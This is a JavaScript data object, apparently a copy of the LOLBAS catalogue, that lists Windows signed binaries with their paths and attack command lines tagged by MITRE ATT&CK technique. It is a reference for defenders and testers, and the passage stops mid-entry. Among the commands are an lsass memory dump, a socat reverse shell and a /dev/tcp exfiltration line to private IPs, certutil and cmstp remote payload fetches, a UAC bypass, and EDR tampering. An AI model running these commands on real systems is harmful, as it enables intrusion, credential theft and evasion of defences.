const LOLBAS = {
  "acccheckconsole": {
    name: "AccCheckConsole.exe",
    description: "Verifies UI accessibility requirements",
    path: ["C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22000.0\\x86\\AccChecker\\AccCheckConsole.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22000.0\\x64\\AccChecker\\AccCheckConsole.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22000.0\\arm\\AccChecker\\AccCheckConsole.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22000.0\\arm64\\AccChecker\\AccCheckConsole.exe"],
    commands: [{"cmd": "AccCheckConsole.exe -window \"Untitled - Notepad\" {PATH_ABSOLUTE:.dll}", "desc": "Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.", "usecase": "Local execution of managed code from assembly DLL.", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "AccCheckConsole.exe -window \"Untitled - Notepad\" {PATH_ABSOLUTE:.dll}", "desc": "Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.", "usecase": "Local execution of managed code to bypass AppLocker.", "category": "AWL Bypass", "mitre": "T1218", "privileges": "User"}]
  },
  "addinutil": {
    name: "AddinUtil.exe",
    description: ".NET Tool used for updating cache files for Microsoft Office Add-Ins.",
    path: ["C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AddinUtil.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddinUtil.exe", "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\AddInUtil.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\AddInUtil.exe"],
    commands: [{"cmd": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AddinUtil.exe -AddinRoot:.", "desc": "AddinUtil is executed from the directory where the 'Addins.Store' payload exists, AddinUtil will execute the 'Addins.Store' payload.", "usecase": "Proxy execution of malicious serialized payload", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "adplus": {
    name: "adplus.exe",
    description: "Debugging tool included with Windows Debugging Tools",
    path: ["C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\adplus.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\adplus.exe"],
    commands: [{"cmd": "adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet", "desc": "Creates a memory dump of the lsass process", "usecase": "Create memory dump and parse it offline", "category": "Dump", "mitre": "T1003.001", "privileges": "SYSTEM"}, {"cmd": "adplus.exe -c {PATH:.xml}", "desc": "Execute arbitrary commands using adplus config file (see Resources section for a sample file).", "usecase": "Run commands under a trusted Microsoft signed binary", "category": "Execute", "mitre": "T1127", "privileges": "User"}, {"cmd": "adplus.exe -c {PATH:.xml}", "desc": "Dump process memory using adplus config file (see Resources section for a sample file).", "usecase": "Run commands under a trusted Microsoft signed binary", "category": "Dump", "mitre": "T1003.001", "privileges": "SYSTEM"}, {"cmd": "adplus.exe -crash -o \"{PATH_ABSOLUTE:folder}\" -sc {PATH:.exe}", "desc": "Execute arbitrary commands and binaries from the context of adplus. Note that providing an output directory via '-o' is required.", "usecase": "Run commands under a trusted Microsoft signed binary", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "agentexecutor": {
    name: "AgentExecutor.exe",
    description: "Intune Management Extension included on Intune Managed Devices",
    path: ["C:\\Program Files (x86)\\Microsoft Intune Management Extension\\AgentExecutor.exe"],
    commands: [{"cmd": "AgentExecutor.exe -powershell \"{PATH_ABSOLUTE:.ps1}\" \"{PATH_ABSOLUTE:.1.log}\" \"{PATH_ABSOLUTE:.2.log}\" \"{PATH_ABSOLUTE:.3.log}\" 60000 \"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\" 0 1", "desc": "Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument", "usecase": "Execute unsigned powershell scripts", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "AgentExecutor.exe -powershell \"{PATH_ABSOLUTE:.ps1}\" \"{PATH_ABSOLUTE:.1.log}\" \"{PATH_ABSOLUTE:.2.log}\" \"{PATH_ABSOLUTE:.3.log}\" 60000 \"{PATH_ABSOLUTE:folder}\" 0 1", "desc": "If we place a binary named powershell.exe in the specified folder path, agentexecutor.exe will execute it successfully", "usecase": "Execute a provided EXE", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "appcert": {
    name: "AppCert.exe",
    description: "Windows App Certification Kit command-line tool.",
    path: ["C:\\Program Files (x86)\\Windows Kits\\10\\App Certification Kit\\appcert.exe", "C:\\Program Files\\Windows Kits\\10\\App Certification Kit\\appcert.exe"],
    commands: [{"cmd": "appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml}", "desc": "Execute an executable file via the Windows App Certification Kit command-line tool.", "usecase": "Performs execution of specified file, can be used as a defense evasion", "category": "Execute", "mitre": "T1127", "privileges": "Administrator"}, {"cmd": "appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml}", "desc": "Install an MSI file via an msiexec instance spawned via appcert.exe as parent process.", "usecase": "Execute custom made MSI file with malicious code", "category": "Execute", "mitre": "T1218.007", "privileges": "Administrator"}]
  },
  "appinstaller": {
    name: "AppInstaller.exe",
    description: "Tool used for installation of AppX/MSIX applications on Windows 10",
    path: ["C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\\AppInstaller.exe"],
    commands: [{"cmd": "start ms-appinstaller://?source={REMOTEURL:.exe}", "desc": "AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in INetCache.", "usecase": "Download file from Internet", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "applauncher": {
    name: "AppLauncher.exe",
    description: "User Experience Virtualization tool that launches applications under monitoring to capture and synchronize user settings.",
    path: ["C:\\Program Files\\Windows Kits\\10\\Microsoft User Experience Virtualization\\Management\\AppLauncher.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\Microsoft User Experience Virtualization\\Management\\AppLauncher.exe"],
    commands: [{"cmd": "AppLauncher.exe {PATH_ABSOLUTE:.exe}", "desc": "Launches an executable via User Experience Virtualization tool.", "usecase": "Executes an executable under a trusted, Microsoft signed binary.", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "appvlp": {
    name: "Appvlp.exe",
    description: "Application Virtualization Utility Included with Microsoft Office 2016",
    path: ["C:\\Program Files\\Microsoft Office\\root\\client\\appvlp.exe", "C:\\Program Files (x86)\\Microsoft Office\\root\\client\\appvlp.exe"],
    commands: [{"cmd": "AppVLP.exe {PATH_SMB:.bat}", "desc": "Executes .bat file through AppVLP.exe", "usecase": "Execution of BAT file hosted on Webdav server.", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "AppVLP.exe powershell.exe -c \"$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)\"", "desc": "Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.", "usecase": "Local execution of process bypassing Attack Surface Reduction (ASR).", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "aspnet_compiler": {
    name: "Aspnet_Compiler.exe",
    description: "ASP.NET Compilation Tool",
    path: ["c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe", "c:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe"],
    commands: [{"cmd": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v none -p C:\\users\\cpl.internal\\desktop\\asptest\\ -f C:\\users\\cpl.internal\\desktop\\asptest\\none -u", "desc": "Execute C# code with the Build Provider and proper folder structure in place.", "usecase": "Execute proxied payload with Microsoft signed binary to bypass application control solutions", "category": "AWL Bypass", "mitre": "T1127", "privileges": "User"}]
  },
  "at": {
    name: "At.exe",
    description: "Schedule periodic tasks",
    path: ["C:\\WINDOWS\\System32\\At.exe", "C:\\WINDOWS\\SysWOW64\\At.exe"],
    commands: [{"cmd": "C:\\Windows\\System32\\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}", "desc": "Create a recurring task to execute every day at a specific time.", "usecase": "Create a recurring task, to eg. to keep reverse shell session(s) alive", "category": "Execute", "mitre": "T1053.002", "privileges": "Local Admin"}]
  },
  "atbroker": {
    name: "Atbroker.exe",
    description: "Helper binary for Assistive Technology (AT)",
    path: ["C:\\Windows\\System32\\Atbroker.exe", "C:\\Windows\\SysWOW64\\Atbroker.exe"],
    commands: [{"cmd": "ATBroker.exe /start malware", "desc": "Start a registered Assistive Technology (AT).", "usecase": "Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistive Technology (AT) service entry.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "bash": {
    name: "Bash.exe",
    description: "File used by Windows subsystem for Linux",
    path: ["C:\\Windows\\System32\\bash.exe", "C:\\Windows\\SysWOW64\\bash.exe"],
    commands: [{"cmd": "bash.exe -c \"{CMD}\"", "desc": "Executes executable from bash.exe", "usecase": "Performs execution of specified file, can be used as a defensive evasion.", "category": "Execute", "mitre": "T1202", "privileges": "User"}, {"cmd": "bash.exe -c \"socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane\"", "desc": "Executes a reverse shell", "usecase": "Performs execution of specified file, can be used as a defensive evasion.", "category": "Execute", "mitre": "T1202", "privileges": "User"}, {"cmd": "bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'", "desc": "Exfiltrate data", "usecase": "Performs execution of specified file, can be used as a defensive evasion.", "category": "Execute", "mitre": "T1202", "privileges": "User"}, {"cmd": "bash.exe -c \"{CMD}\"", "desc": "Executes executable from bash.exe", "usecase": "Performs execution of specified file, can be used to bypass Application Whitelisting.", "category": "AWL Bypass", "mitre": "T1202", "privileges": "User"}, {"cmd": "bash.exe", "desc": "When executed, `bash.exe` queries the registry value of `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Lxss\\MSI\\InstallLocation`, which contains a folder path (`c:\\program files\\wsl` by default). If the value points to another folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder.", "usecase": "Execute a payload as a child process of `bash.exe` while masquerading as WSL.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "bcp": {
    name: "Bcp.exe",
    description: "Microsoft SQL Server Bulk Copy Program utility for importing and exporting data between SQL Server instances and data files.",
    path: ["C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\bcp.exe", "C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\130\\Tools\\Binn\\bcp.exe", "C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\110\\Tools\\Binn\\bcp.exe", "C:\\Program Files (x86)\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\bcp.exe", "C:\\Program Files (x86)\\Microsoft SQL Server\\Client SDK\\ODBC\\130\\Tools\\Binn\\bcp.exe", "C:\\Program Files (x86)\\Microsoft SQL Server\\Client SDK\\ODBC\\110\\Tools\\Binn\\bcp.exe", "C:\\Program Files (x86)\\Microsoft SQL Server\\120\\Tools\\Binn\\bcp.exe"],
    commands: [{"cmd": "bcp \"SELECT payload_data FROM database.dbo.payloads WHERE id=1\" queryout \"C:\\Windows\\Temp\\payload.exe\" -S localhost -T -c", "desc": "Export binary payload stored in SQL Server database to file system.", "usecase": "Extract malicious executable from database storage to local file system for execution.", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "bginfo": {
    name: "Bginfo.exe",
    description: "Background Information Utility included with SysInternals Suite",
    path: ["no default"],
    commands: [{"cmd": "bginfo.exe {PATH:.bgi} /popup /nolicprompt", "desc": "Execute VBscript code that is referenced within the specified .bgi file.", "usecase": "Local execution of VBScript", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "bginfo.exe {PATH:.bgi} /popup /nolicprompt", "desc": "Execute VBscript code that is referenced within the specified .bgi file.", "usecase": "Local execution of VBScript", "category": "AWL Bypass", "mitre": "T1218", "privileges": "User"}, {"cmd": "\\\\10.10.10.10\\webdav\\bginfo.exe {PATH:.bgi} /popup /nolicprompt", "desc": "Execute bginfo.exe from a WebDAV server.", "usecase": "Remote execution of VBScript", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "\\\\10.10.10.10\\webdav\\bginfo.exe {PATH:.bgi} /popup /nolicprompt", "desc": "Execute bginfo.exe from a WebDAV server.", "usecase": "Remote execution of VBScript", "category": "AWL Bypass", "mitre": "T1218", "privileges": "User"}, {"cmd": "\\\\live.sysinternals.com\\Tools\\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt", "desc": "This style of execution may not longer work due to patch.", "usecase": "Remote execution of VBScript", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "\\\\live.sysinternals.com\\Tools\\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt", "desc": "This style of execution may not longer work due to patch.", "usecase": "Remote execution of VBScript", "category": "AWL Bypass", "mitre": "T1218", "privileges": "User"}]
  },
  "bitsadmin": {
    name: "Bitsadmin.exe",
    description: "Used for managing background intelligent transfer",
    path: ["C:\\Windows\\System32\\bitsadmin.exe", "C:\\Windows\\SysWOW64\\bitsadmin.exe"],
    commands: [{"cmd": "bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1", "desc": "Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.", "usecase": "Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique.", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1", "desc": "Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.", "usecase": "Download file from Internet", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset", "desc": "Command for copying cmd.exe to another folder", "usecase": "Copy file", "category": "Copy", "mitre": "T1105", "privileges": "User"}, {"cmd": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset", "desc": "One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.", "usecase": "Execute binary file specified. Can be used as a defensive evasion.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "cdb": {
    name: "Cdb.exe",
    description: "Debugging tool included with Windows Debugging Tools.",
    path: ["C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\cdb.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\cdb.exe"],
    commands: [{"cmd": "cdb.exe -cf {PATH:.wds} -o notepad.exe", "desc": "Launch 64-bit shellcode from the specified .wds file using cdb.exe.", "usecase": "Local execution of assembly shellcode.", "category": "Execute", "mitre": "T1127", "privileges": "User"}, {"cmd": "cdb.exe -pd -pn {process_name}\n.shell {CMD}", "desc": "Attaching to any process and executing shell commands.", "usecase": "Run a shell command under a trusted Microsoft signed binary", "category": "Execute", "mitre": "T1127", "privileges": "User"}, {"cmd": "cdb.exe -c {PATH:.txt} \"{CMD}\"", "desc": "Execute arbitrary commands and binaries using a debugging script (see Resources section for a sample file).", "usecase": "Run commands under a trusted Microsoft signed binary", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "certoc": {
    name: "CertOC.exe",
    description: "Used for installing certificates",
    path: ["c:\\windows\\system32\\certoc.exe", "c:\\windows\\syswow64\\certoc.exe"],
    commands: [{"cmd": "certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}", "desc": "Loads the target DLL file", "usecase": "Execute code within DLL file", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "certoc.exe -GetCACAPS {REMOTEURL:.ps1}", "desc": "Downloads text formatted files", "usecase": "Download scripts, webshells etc.", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "certreq": {
    name: "CertReq.exe",
    description: "Used for requesting and managing certificates",
    path: ["C:\\Windows\\System32\\certreq.exe", "C:\\Windows\\SysWOW64\\certreq.exe"],
    commands: [{"cmd": "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}", "desc": "Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to the specified txt file (last argument).", "usecase": "Download file from Internet", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}", "desc": "Send the specified file (last argument) to the specified URL via HTTP POST and show response in terminal.", "usecase": "Upload", "category": "Upload", "mitre": "T1105", "privileges": "User"}]
  },
  "certutil": {
    name: "Certutil.exe",
    description: "Windows binary used for handling certificates",
    path: ["C:\\Windows\\System32\\certutil.exe", "C:\\Windows\\SysWOW64\\certutil.exe"],
    commands: [{"cmd": "certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}", "desc": "Download and save an executable to disk in the current folder.", "usecase": "Download file from Internet", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}", "desc": "Download and save an executable to disk in the current folder when a file path is specified, or `%LOCALAPPDATA%low\\Microsoft\\CryptnetUrlCache\\Content\\<hash>` when not.", "usecase": "Download file from Internet", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt", "desc": "Download and save a .ps1 file to an Alternate Data Stream (ADS).", "usecase": "Download file from Internet and save it in an NTFS Alternate Data Stream", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "certutil.exe -URL {REMOTEURL:.exe}", "desc": "Download and save an executable to `%LOCALAPPDATA%low\\Microsoft\\CryptnetUrlCache\\Content\\<hash>`.", "usecase": "Download file from Internet", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "certutil -encode {PATH} {PATH:.base64}", "desc": "Command to encode a file using Base64", "usecase": "Encode files to evade defensive measures", "category": "Encode", "mitre": "T1027.013", "privileges": "User"}, {"cmd": "certutil -decode {PATH:.base64} {PATH}", "desc": "Command to decode a Base64 encoded file.", "usecase": "Decode files to evade defensive measures", "category": "Decode", "mitre": "T1140", "privileges": "User"}, {"cmd": "certutil -decodehex {PATH:.hex} {PATH}", "desc": "Command to decode a hexadecimal-encoded file.", "usecase": "Decode files to evade defensive measures", "category": "Decode", "mitre": "T1140", "privileges": "User"}]
  },
  "change": {
    name: "Change.exe",
    description: "Remote Desktop Services MultiUser Change Utility",
    path: ["c:\\windows\\system32\\change.exe", "c:\\windows\\syswow64\\change.exe"],
    commands: [{"cmd": "change.exe user", "desc": "Once executed, `change.exe` will execute `chgusr.exe` in the same folder. Thus, if `change.exe` is copied to a folder and an arbitrary executable is renamed to `chgusr.exe`, `change.exe` will spawn it. Instead of `user`, it is also possible to use `port` or `logon` as command-line option.", "usecase": "Execute an arbitrary executable via trusted system executable.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "cipher": {
    name: "Cipher.exe",
    description: "File Encryption Utility",
    path: ["c:\\windows\\system32\\cipher.exe", "c:\\windows\\syswow64\\cipher.exe"],
    commands: [{"cmd": "cipher /w:{PATH_ABSOLUTE:folder}", "desc": "Zero out a file", "usecase": "Can be used to forensically erase a file.", "category": "Tamper", "mitre": "T1485", "privileges": "User"}, {"cmd": "cipher.exe /e {PATH_ABSOLUTE}", "desc": "Encrypt a file", "usecase": "Can be used to impair defences by e.g. encrypting a critical EDR solution file.", "category": "Tamper", "mitre": "T1562", "privileges": "Admin"}]
  },
  "cl_invocation": {
    name: "CL_Invocation.ps1",
    description: "Aero diagnostics script",
    path: ["C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1", "C:\\Windows\\diagnostics\\system\\Audio\\CL_Invocation.ps1", "C:\\Windows\\diagnostics\\system\\WindowsUpdate\\CL_Invocation.ps1"],
    commands: [{"cmd": ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1   \\nSyncInvoke {CMD}", "desc": "Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable.", "usecase": "Proxy execution", "category": "Execute", "mitre": "T1216", "privileges": "User"}]
  },
  "cl_loadassembly": {
    name: "CL_LoadAssembly.ps1",
    description: "PowerShell Diagnostic Script",
    path: ["C:\\Windows\\diagnostics\\system\\Audio\\CL_LoadAssembly.ps1"],
    commands: [{"cmd": "powershell.exe -ep bypass -command \"set-location -path C:\\Windows\\diagnostics\\system\\Audio; import-module .\\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\\..\\..\\..\\testing\\fun.dll;[Program]::Fun()\"", "desc": "Proxy execute Managed DLL with PowerShell", "usecase": "Execute proxied payload with Microsoft signed binary", "category": "Execute", "mitre": "T1216", "privileges": "User"}]
  },
  "cl_mutexverifiers": {
    name: "CL_Mutexverifiers.ps1",
    description: "Proxy execution with CL_Mutexverifiers.ps1",
    path: ["C:\\Windows\\diagnostics\\system\\WindowsUpdate\\CL_Mutexverifiers.ps1", "C:\\Windows\\diagnostics\\system\\Audio\\CL_Mutexverifiers.ps1", "C:\\Windows\\diagnostics\\system\\WindowsUpdate\\CL_Mutexverifiers.ps1", "C:\\Windows\\diagnostics\\system\\Video\\CL_Mutexverifiers.ps1", "C:\\Windows\\diagnostics\\system\\Speech\\CL_Mutexverifiers.ps1"],
    commands: [{"cmd": ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess {PATH:.ps1}", "desc": "Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch an executable.", "usecase": "Proxy execution", "category": "Execute", "mitre": "T1216", "privileges": "User"}]
  },
  "cmd": {
    name: "Cmd.exe",
    description: "The command-line interpreter in Windows",
    path: ["C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\SysWOW64\\cmd.exe"],
    commands: [{"cmd": "cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat", "desc": "Add content to an Alternate Data Stream (ADS).", "usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "cmd.exe - < {PATH}:payload.bat", "desc": "Execute payload.bat stored in an Alternate Data Stream (ADS).", "usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism", "category": "ADS", "mitre": "T1059.003", "privileges": "User"}, {"cmd": "type {PATH_SMB} > {PATH_ABSOLUTE}", "desc": "Downloads a specified file from a WebDAV server to the target file.", "usecase": "Download/copy a file from a WebDAV server", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "type {PATH_ABSOLUTE} > {PATH_SMB}", "desc": "Uploads a specified file to a WebDAV server.", "usecase": "Upload a file to a WebDAV server", "category": "Upload", "mitre": "T1048.003", "privileges": "User"}]
  },
  "cmdkey": {
    name: "Cmdkey.exe",
    description: "creates, lists, and deletes stored user names and passwords or credentials.",
    path: ["C:\\Windows\\System32\\cmdkey.exe", "C:\\Windows\\SysWOW64\\cmdkey.exe"],
    commands: [{"cmd": "cmdkey /list", "desc": "List cached credentials", "usecase": "Get credential information from host", "category": "Credentials", "mitre": "T1078", "privileges": "User"}]
  },
  "cmdl32": {
    name: "cmdl32.exe",
    description: "Microsoft Connection Manager Auto-Download",
    path: ["C:\\Windows\\System32\\cmdl32.exe", "C:\\Windows\\SysWOW64\\cmdl32.exe"],
    commands: [{"cmd": "cmdl32 /vpn /lan %cd%\\config", "desc": "Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under the name VPNXXXX.tmp where \"X\" denotes a random number or letter.", "usecase": "Download file from Internet", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "cmstp": {
    name: "Cmstp.exe",
    description: "Installs or removes a Connection Manager service profile.",
    path: ["C:\\Windows\\System32\\cmstp.exe", "C:\\Windows\\SysWOW64\\cmstp.exe"],
    commands: [{"cmd": "cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}", "desc": "Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.", "usecase": "Execute code hidden within an inf file. Download and run scriptlets from internet.", "category": "Execute", "mitre": "T1218.003", "privileges": "User"}, {"cmd": "cmstp.exe /ni /s {REMOTEURL:.inf}", "desc": "Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.", "usecase": "Execute code hidden within an inf file. Execute code directly from Internet.", "category": "AWL Bypass", "mitre": "T1218.003", "privileges": "User"}, {"cmd": "cmstp.exe /nf", "desc": "cmstp.exe reads the `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe\\CmstpExtensionDll` registry value and passes its data directly to `LoadLibrary`. By modifying this registry key and setting it to an attack-controlled DLL, this will sideload the DLL via `cmstp.exe`.", "usecase": "Proxy execution of a malicious DLL via registry modification.", "category": "Execute", "mitre": "T1218.003", "privileges": "Administrator"}]
  },
  "colorcpl": {
    name: "Colorcpl.exe",
    description: "Binary that handles color management",
    path: ["C:\\Windows\\System32\\colorcpl.exe", "C:\\Windows\\SysWOW64\\colorcpl.exe"],
    commands: [{"cmd": "colorcpl {PATH}", "desc": "Copies the referenced file to C:\\Windows\\System32\\spool\\drivers\\color\\.", "usecase": "Copies file(s) to a subfolder of a generally trusted folder (c:\\Windows\\System32), which can be used to hide files or make them blend into the environment.", "category": "Copy", "mitre": "T1036.005", "privileges": "User"}]
  },
  "computerdefaults": {
    name: "ComputerDefaults.exe",
    description: "ComputerDefaults.exe is a Windows system utility for managing default applications for tasks like web browsing, emailing, and media playback.",
    path: ["C:\\Windows\\System32\\ComputerDefaults.exe", "C:\\Windows\\SysWOW64\\ComputerDefaults.exe"],
    commands: [{"cmd": "ComputerDefaults.exe", "desc": "Upon execution, ComputerDefaults.exe checks two registry values at HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\open\\command; if these are set by an attacker, the set command will be executed as a high-integrity process without a UAC prompt being displayed to the user. See 'resources' for which registry keys/values to set.", "usecase": "Execute a binary or script as a high-integrity process without a UAC prompt.", "category": "UAC Bypass", "mitre": "T1548.002", "privileges": "User"}]
  },
  "configsecuritypolicy": {
    name: "ConfigSecurityPolicy.exe",
    description: "Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.",
    path: ["C:\\Program Files\\Windows Defender\\ConfigSecurityPolicy.exe", "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\ConfigSecurityPolicy.exe"],
    commands: [{"cmd": "ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}", "desc": "Upload file, credentials or data exfiltration in general", "usecase": "Upload file", "category": "Upload", "mitre": "T1567", "privileges": "User"}, {"cmd": "ConfigSecurityPolicy.exe {REMOTEURL}", "desc": "It will download a remote payload and place it in INetCache.", "usecase": "Downloads payload from remote server", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "conhost": {
    name: "Conhost.exe",
    description: "Console Window host",
    path: ["c:\\windows\\system32\\conhost.exe"],
    commands: [{"cmd": "conhost.exe {CMD}", "desc": "Execute a command line with conhost.exe as parent process", "usecase": "Use conhost.exe as a proxy binary to evade defensive counter-measures", "category": "Execute", "mitre": "T1202", "privileges": "User"}, {"cmd": "conhost.exe --headless {CMD}", "desc": "Execute a command line with conhost.exe as parent process", "usecase": "Specify --headless parameter to hide child process window (if applicable)", "category": "Execute", "mitre": "T1202", "privileges": "User"}]
  },
  "control": {
    name: "Control.exe",
    description: "Binary used to launch controlpanel items in Windows",
    path: ["C:\\Windows\\System32\\control.exe", "C:\\Windows\\SysWOW64\\control.exe"],
    commands: [{"cmd": "control.exe {PATH_ABSOLUTE}:evil.dll", "desc": "Execute evil.dll which is stored in an Alternate Data Stream (ADS).", "usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism", "category": "ADS", "mitre": "T1218.002", "privileges": "User"}, {"cmd": "control.exe {PATH_ABSOLUTE:.cpl}", "desc": "Execute .cpl file. A CPL is a DLL file with CPlApplet export function)", "usecase": "Use to execute code and bypass application whitelisting", "category": "Execute", "mitre": "T1218.002", "privileges": "User"}]
  },
  "coregen": {
    name: "coregen.exe",
